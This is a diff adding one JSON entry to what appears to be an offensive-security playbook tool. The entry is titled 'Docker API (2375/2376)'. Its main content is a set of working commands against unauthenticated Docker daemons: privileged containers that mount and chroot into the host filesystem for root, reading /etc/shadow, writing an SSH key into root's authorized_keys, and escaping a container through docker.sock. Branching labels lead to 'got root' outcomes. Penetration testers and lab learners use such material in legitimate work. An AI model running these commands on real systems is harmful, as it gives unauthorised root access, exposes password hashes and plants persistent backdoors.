@@ -1,0 +1,22 @@
+{
+  "id": "docker_api",
+  "phase": "RECON",
+  "title": "Docker API (2375/2376)",
+  "body": "Exposed Docker API = instant root on the host. Mount the host filesystem into a privileged container. No password needed on port 2375.",
+  "cmd": "nmap -p 2375,2376 -sV $ip\ncurl -s http://$ip:2375/containers/json   # if returns data = unauthenticated\ncurl -s http://$ip:2375/version\n\n# List containers and images\nexport DOCKER_HOST=\"tcp://$ip:2375\"\ndocker ps -a\ndocker images\n\n# Instant root — mount host filesystem\ndocker -H tcp://$ip:2375 run -it --rm \\\n  --privileged -v /:/mnt alpine chroot /mnt sh\n\n# Read /etc/shadow\ndocker -H tcp://$ip:2375 run --rm \\\n  -v /etc:/mnt/etc alpine cat /mnt/etc/shadow\n\n# Write SSH key to host root\ndocker -H tcp://$ip:2375 run --rm \\\n  -v /root/.ssh:/mnt/.ssh alpine sh -c \\\n  \"echo 'ssh-rsa YOURKEY' >> /mnt/.ssh/authorized_keys\"\n\n# Container escape if already inside container\n# Check if privileged: cat /proc/self/status | grep CapEff\n# Check for docker socket: ls -la /var/run/docker.sock\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+  "warn": "Port 2375 = unauthenticated. Port 2376 = TLS. If docker.sock is mounted inside a container you're already in, you can escape to host.",
+  "choices": [
+    {
+      "label": "Mounted host FS — got root on host",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Inside container with docker.sock",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Found creds in container env vars",
+      "next": "creds_found"
+    }
+  ]
+}
